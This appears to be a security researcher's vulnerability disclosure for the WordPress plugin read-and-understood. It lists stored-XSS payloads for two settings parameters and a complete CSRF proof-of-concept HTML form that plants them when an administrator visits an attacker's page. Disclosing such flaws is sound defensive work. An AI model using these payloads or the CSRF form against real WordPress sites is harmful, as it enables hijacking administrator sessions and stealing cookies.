Well ,sir ,I just found some Stored-XSS bugs and a CSRF bug at wp-plugin read-and-understood.

#### ADLab of Venustech

#### Stored-XSS

When the admin user click the "Save changes" button in the read-and-understood setting page, we'll post some data to:

```
http://127.0.0.1/wordpress/wp-admin/options-general.php?page=read-and-understood-menu-slug-01
```

But when I pentest the  parameter in this plugin, I found when I write something into this point, it does not filter well.

Weak data parameters:

```
1.rnu_username_validation_title=at+least+one+but+no+more+than+10+capital+letters'"><svg/onload=console.log(/xss/)><'"
2.rnu_username_validation_pattern=%5BA-Z%5D%7B1%2C10%7D'"><svg/onload=console.log(/xss2/)><'"

```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/read-and-understood/xss.png)


#### CSRF

Well, the stored-xss bugs here need to combined with a csrf bug. Because no csrf protection here, we can cheat the admin user to visit the evil html on the evil site.

POC:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/wordpress/wp-admin/options-general.php?page=read-and-understood-menu-slug-01" method="POST">
      <input type="hidden" name="rnu&#95;username&#95;validation&#95;pattern" value="&#91;A&#45;Z&#93;&#123;1&#44;10&#125;&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss2&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="rnu&#95;username&#95;validation&#95;title" value="at&#32;least&#32;one&#32;but&#32;no&#32;more&#32;than&#32;10&#32;capital&#32;letters&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="rnu&#95;username" value="" />
      <input type="hidden" name="Submit" value="Save&#32;Changes" />
      <input type="hidden" name="submit&#95;hidden" value="Y" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


```

In a word, if the manager could be cheated to visit my evil html on my site, I can get the manager's cookie easily, or do something more evilly.


Well,  by the way, I just test the bug in the wordpress 4.9.1 and the latest version of the wp-plugin read-and-understood.
